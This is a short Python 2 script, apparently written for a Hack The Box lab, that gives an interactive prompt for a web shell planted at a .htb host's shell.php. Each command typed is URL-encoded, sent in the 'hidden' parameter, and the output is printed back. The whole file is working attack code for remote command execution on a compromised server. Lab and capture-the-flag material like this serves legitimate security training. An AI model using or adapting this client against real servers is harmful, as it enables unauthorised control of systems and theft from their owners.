#!/usr/bin/python
from __future__ import print_function
import requests
import urllib

target = "http://sec03.rentahacker.htb/shell.php?hidden="

cmd = ""
while cmd != "exit":
    print("> ", end="")
    cmd = raw_input()
    cmd = cmd.strip()
    res = requests.get(target + urllib.quote(cmd))
    print(res.content)
